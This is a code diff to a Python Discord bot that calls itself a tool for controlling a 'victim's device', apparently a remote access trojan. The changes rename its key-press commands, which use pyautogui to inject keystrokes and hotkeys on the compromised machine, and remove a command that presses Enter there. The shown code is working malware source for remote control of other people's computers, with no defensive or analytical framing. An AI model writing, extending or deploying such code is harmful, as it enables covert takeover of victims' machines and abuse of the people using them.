@@ -208,16 +208,16 @@ async def rclick(ctx):
     except Exception as e:
         await ctx.reply(f"Error executing right click: {str(e)}")
 
-@bot.command(help="Press a key/hotkey on victim's device.\nAvailable functions: press, keydown, keyup, hotkey (format button+button). Available keys: https://bit.ly/3ya6vKg")
+@bot.command(help="Press a key/hotkey on victim's device.\nAvailable functions: press, down, up, hotkey (format button+button). Available keys: https://bit.ly/3ya6vKg")
 async def key(ctx, func: str = "", value: str = ""):
     if not func:
-        await ctx.reply("Function not provided. Available functions: press, keydown, keyup, hotkey.")
+        await ctx.reply("Function not provided. Available functions: press, down, up, hotkey.")
         return
 
     func = func.lower()
     
-    if func not in ["press", "keydown", "keyup", "hotkey"]:
-        await ctx.reply("Invalid function. Available functions: press, keydown, keyup, hotkey.")
+    if func not in ["press", "down", "up", "hotkey"]:
+        await ctx.reply("Invalid function. Available functions: press, down, up, hotkey.")
         return
 
     if not value or value == "":
@@ -227,9 +227,9 @@ async def key(ctx, func: str = "", value: str = ""):
     try:
         if func == "press":
             pyautogui.press(value)
-        elif func == "keydown":
+        elif func == "down":
             pyautogui.keyDown(value)
-        elif func == "keyup":
+        elif func == "up":
             pyautogui.keyUp(value)
         elif func == "hotkey":
             keys = value.split("+")
@@ -374,14 +374,6 @@ async def run(ctx, *, program: str):
 async def write(ctx, *, text: str):
     try:
         pyautogui.write(text)
-        await ctx.reply("Command Executed!")
-    except Exception as e:
-        await ctx.reply(f"Error executing command: {str(e)}")
-
-@bot.command(help="Presses the 'Enter' key on the victim's system.")
-async def enter(ctx):
-    try:
-        pyautogui.press('enter')
         await ctx.reply("Command Executed!")
     except Exception as e:
         await ctx.reply(f"Error executing command: {str(e)}")
